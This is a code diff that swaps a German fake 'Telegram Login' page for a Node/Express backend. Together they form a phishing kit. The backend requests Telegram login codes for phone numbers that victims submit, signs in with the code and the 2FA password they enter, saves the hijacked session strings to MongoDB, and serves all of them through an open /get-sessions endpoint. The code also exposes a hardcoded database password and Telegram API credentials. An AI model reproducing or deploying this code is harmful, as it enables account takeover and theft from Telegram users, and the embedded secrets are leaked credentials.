@@ -1,71 +1,65 @@
-<!DOCTYPE html>
-<html lang="de">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login</title>
-    <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; }
-        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 300px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        #loader { display: none; margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <div class="card" id="step1">
-        <h2>Telegram Login</h2>
-        <input type="text" id="phone" placeholder="+49123456789">
-        <button onclick="sendOTP()">Weiter</button>
-    </div>
+const express = require('express');
+const cors = require('cors');
+const { TelegramClient, Api } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const mongoose = require('mongoose');
 
-    <div class="card" id="step2" style="display:none;">
-        <h3>Code eingeben</h3>
-        <input type="text" id="otp" placeholder="Code">
-        <button onclick="verifyOTP()">Verifizieren</button>
-    </div>
+const app = express();
+app.use(cors());
+app.use(express.json());
 
-    <div id="loader">
-        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ2ZzZng4bHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxxHOGTdzJC/giphy.gif" width="50">
-        <p>Lade...</p>
-    </div>
+// MongoDB Setup
+const mongoURI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
+mongoose.connect(mongoURI);
 
-    <script>
-        let phone = "";
-        const BACKEND = "https://telegram-backend-yr2r.onrender.com";
+const SessionSchema = new mongoose.Schema({
+    phone: String,
+    session: String,
+    createdAt: { type: Date, default: Date.now }
+});
+const SessionModel = mongoose.model('Session', SessionSchema);
 
-        async function sendOTP() {
-            phone = document.getElementById('phone').value;
-            document.getElementById('loader').style.display = 'block';
-            const res = await fetch(`${BACKEND}/send-otp`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phoneNumber: phone })
-            });
-            if(res.ok) {
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-            } else {
-                alert('Fehler: Nummer ungültig');
+const apiId = 23049703;
+const apiHash = 'e9c00af578a9de0253ef02337460498f';
+
+let tempClients = {};
+
+app.post('/send-otp', async (req, res) => {
+    const { phone } = req.body;
+    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+    await client.connect();
+    const result = await client.sendCode({ apiId, apiHash }, phone);
+    tempClients[phone] = { client, phoneCodeHash: result.phoneCodeHash };
+    res.json({ success: true });
+});
+
+app.post('/verify-otp', async (req, res) => {
+    const { phone, code, password } = req.body;
+    const { client, phoneCodeHash } = tempClients[phone];
+    try {
+        await client.signIn({ apiId, apiHash, phone, phoneCodeHash }, code);
+        const sessionString = client.session.save();
+        await SessionModel.create({ phone, session: sessionString });
+        res.json({ success: true });
+    } catch (err) {
+        if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+            try {
+                await client.signIn({ password: password }, phone);
+                const sessionString = client.session.save();
+                await SessionModel.create({ phone, session: sessionString });
+                res.json({ success: true });
+            } catch (pErr) {
+                res.status(400).json({ error: 'Falsches Passwort' });
             }
-            document.getElementById('loader').style.display = 'none';
+        } else {
+            res.status(400).json({ error: err.message });
         }
+    }
+});
 
-        async function verifyOTP() {
-            const otp = document.getElementById('otp').value;
-            document.getElementById('loader').style.display = 'block';
-            const res = await fetch(`${BACKEND}/verify-otp`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phoneNumber: phone, otp: otp })
-            });
-            if(res.ok) {
-                alert('Erfolgreich!');
-            } else {
-                alert('Fehler: Code ungültig');
-            }
-            document.getElementById('loader').style.display = 'none';
-        }
-    </script>
-</body>
-</html>
+app.get('/get-sessions', async (req, res) => {
+    const sessions = await SessionModel.find();
+    res.json(sessions);
+});
+
+app.listen(process.env.PORT || 3000, () => console.log('Server running'));
